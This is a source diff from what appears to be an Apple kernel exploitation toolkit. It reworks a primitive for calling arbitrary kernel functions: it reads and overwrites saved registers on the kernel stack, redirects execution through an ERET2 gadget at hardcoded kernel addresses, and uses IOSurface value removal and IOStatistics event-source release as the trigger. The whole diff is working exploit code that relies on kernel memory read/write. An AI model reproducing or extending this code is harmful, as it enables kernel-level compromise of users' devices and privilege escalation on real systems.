@@ -41,6 +41,7 @@
 #define ERET2_ENTRY 0xfffffe000725f09c
 #define LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE 0xfffffe00079df578
 #define LR_BLOCK_RELEASE_HELPER 0xfffffe000796cd04
+#define LR_IS_IO_CONNECT_METHOD 0xfffffe00073a9884 // _Xio_connect_method
 #else
 #error "unknown platform"
 #endif
@@ -216,7 +217,7 @@ int xe_util_kfunc_find_target_thread(uintptr_t proc, uintptr_t* ptr_out) {
 
 
 void xe_util_kfunc_reset(xe_util_kfunc_t util) {
-    // Reuse the previous addresses to avoid signing pointers using PACDA
+    // Reuse the previous addresses to avoid resigning pointers using PACDA
     uintptr_t block = xe_util_zalloc_alloc(util->block_allocator, 0);
     uintptr_t event_source = xe_util_zalloc_alloc(util->io_event_source_allocator, 0);
     uintptr_t reserved = xe_util_zalloc_alloc(util->reserved_allocator, 0);
@@ -244,7 +245,7 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     
     uintptr_t surface;
     IOSurfaceRef surface_ref = xe_io_surface_create(&surface);
-    xe_log_debug("created io_surface at %p\n", (void*)surface);
+    xe_log_debug("created io_surface at %p", (void*)surface);
     IOSurfaceSetValue(surface_ref, CFSTR("xe_util_kfunc_key"), kCFBooleanTrue);
     
     xe_util_kfunc_setup_event_source(util);
@@ -259,10 +260,9 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     
     dispatch_semaphore_t sem_surface_destroy = dispatch_semaphore_create(0);
     dispatch_async(xe_dispatch_queue(), ^() {
-        xe_log_debug("io_surface destroy start");
-        IOSurfaceRemoveAllValues(surface_ref);
-        IOSurfaceDecrementUseCount(surface_ref);
-        xe_log_debug("io_surface destory done");
+        xe_log_debug("io_surface remove value start");
+        IOSurfaceRemoveValue(surface_ref, CFSTR("xe_util_kfunc_key"));
+        xe_log_debug("io_surface remove value done");
         dispatch_semaphore_signal(sem_surface_destroy);
     });
     
@@ -275,24 +275,53 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     
     char* kstack_buffer = malloc(STACK_SCAN_SIZE);
     xe_kmem_read(kstack_buffer, kstack, 0, STACK_SCAN_SIZE);
-    uintptr_t lr = xe_util_kfunc_find_ptr(kstack, kstack_buffer, STACK_SCAN_SIZE, xe_slider_kernel_slide(LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE), XE_PTRAUTH_MASK);
-    xe_assert(lr != 0);
+    uintptr_t lr_unregister_event_source = xe_util_kfunc_find_ptr(kstack, kstack_buffer, STACK_SCAN_SIZE, xe_slider_kernel_slide(LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE), XE_PTRAUTH_MASK);
+    xe_assert(lr_unregister_event_source != 0);
+    uintptr_t lr_is_io_connect_method = xe_util_kfunc_find_ptr(kstack, kstack_buffer, STACK_SCAN_SIZE, xe_slider_kernel_slide(LR_IS_IO_CONNECT_METHOD), XE_PTRAUTH_MASK);
+    xe_assert(lr_is_io_connect_method != 0);
+    
     free(kstack_buffer);
     
-    uintptr_t x19 = lr - 0x10;
+    // IOStatistics::unregisterEventSource stack
+    uintptr_t x19 = lr_unregister_event_source - 0x10;
     uintptr_t x20 = x19 - 0x8;
     uintptr_t x21 = x20 - 0x8;
     uintptr_t x22 = x21 - 0x8;
     uintptr_t x23 = x22 - 0x8;
     uintptr_t x24 = x23 - 0x8;
     
+    
+    /*
+     ?? -> []
+     ?? -> [x19-x28] [x24, x22, x27, x26, x25, x20, x19, x21]
+     mach_syscall -> [x19-x24]
+     ipc_kmsg_send -> [x19-x28]
+     0xfffffe001e18d008 -> [x19-x26]
+     ipc_kobject_server -> [x19-x28]
+     _Xio_connect_method -> [x19-x26]
+     is_io_connect_method -> [x19-x28] {x19, x24, x25, x26,
+     x21, x22, x23}
+     IOSurfaceRootUserClient::s_remove_value -> [x19-x24]
+     IOSurfaceRootUserClient::remove_value -> [x19-x24]
+     IOSurface::removeValue -> [x19-x22]
+     IOSurface::removeValue -> [x19-x22]
+     OSDictionary::removeObject -> [x19-x24]
+     IOEventSource::free -> [x19-x20]
+     _Block_release -> [x19-x20]
+     */
+    uintptr_t x19_backup = util->block;
     uintptr_t x20_backup = xe_kmem_read_uint64(x20, 0);
     uintptr_t x21_backup = xe_kmem_read_uint64(x21, 0);
     uintptr_t x22_backup = xe_kmem_read_uint64(x22, 0);
     uintptr_t x23_backup = xe_kmem_read_uint64(x23, 0);
     uintptr_t x24_backup = xe_kmem_read_uint64(x24, 0);
     
-    uintptr_t sp = lr - 0x38 + 0x40 - 0x20;
+    // x25 in is_io_connect_method stack
+    uintptr_t x25_backup = xe_kmem_read_uint64(lr_is_io_connect_method - 0x40, 0);
+    // x23 in is_io_connect_method stack
+    uintptr_t x26_backup = xe_kmem_read_uint64(lr_is_io_connect_method - 0x30, 0);
+    
+    uintptr_t sp = lr_unregister_event_source - 0x38 + 0x40 - 0x20;
     xe_kmem_write_uint64(util->block, offsetof(struct arm_context, ss.uss.sp), sp);
     xe_kmem_write_uint64(x20, 0, xe_slider_kernel_slide(ERET2_ENTRY));
     xe_kmem_write_uint64(x21, 0, 0x400008);
@@ -307,14 +336,14 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     eret2_args.ss.uss.x[5] = args[5];
     eret2_args.ss.uss.x[6] = args[6];
     eret2_args.ss.uss.x[7] = args[7];
-    eret2_args.ss.uss.x[19] = util->block;
+    eret2_args.ss.uss.x[19] = x19_backup;
     eret2_args.ss.uss.x[20] = x20_backup;
     eret2_args.ss.uss.x[21] = x21_backup;
     eret2_args.ss.uss.x[22] = x22_backup;
     eret2_args.ss.uss.x[23] = x23_backup;
     eret2_args.ss.uss.x[24] = x24_backup;
-    eret2_args.ss.uss.x[25] = util->eret2_args;
-    eret2_args.ss.uss.x[26] = util->eret2_args;
+    eret2_args.ss.uss.x[25] = x25_backup;
+    eret2_args.ss.uss.x[26] = x26_backup;
     eret2_args.ss.uss.lr = xe_slider_kernel_slide(LR_BLOCK_RELEASE_HELPER);
     eret2_args.ss.uss.fp = sp + 0x10;
     xe_kmem_write(eret2_arm_context, 0, &eret2_args, sizeof(eret2_args));
@@ -322,6 +351,7 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     xe_util_lck_rw_lock_done(&io_statistics_lock);
     dispatch_semaphore_wait(sem_surface_destroy, DISPATCH_TIME_FOREVER);
     xe_util_kfunc_reset(util);
+    IOSurfaceDecrementUseCount(surface_ref);
 }
 
 
